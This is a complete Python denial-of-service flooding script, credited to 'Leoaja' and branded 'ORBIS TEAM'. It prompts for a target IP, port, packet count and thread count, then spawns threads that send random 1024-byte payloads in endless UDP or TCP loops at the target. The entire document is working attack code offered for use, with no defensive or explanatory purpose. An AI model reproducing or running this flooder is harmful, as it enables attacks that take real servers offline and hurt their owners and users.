import random
import socket
import threading
import os


os.system("clear")
print("\033[95m")
print("Tools by Leoaja")

ip = str(input("\033[91mIP >>>:"))
port = int(input("\033[91mPORT >>>:"))
choice = str(input("\033[91mAttack? (y/n) >>>:"))
times = int(input("\033[91mPacket >>>:"))
threads = int(input("\033[91mThread >>>:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("Attack","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" DDOS ATTACK ORBIS TEAM")
		except:
			print("[!] SERVER DOWN")

def run2():
	data = random._urandom(1024)
	i = random.choice(("Attack","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"  DDOS ATTACK ORBIS TEAM")
		except:
			s.close()
			print("[*] SERVER DOWN")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start() 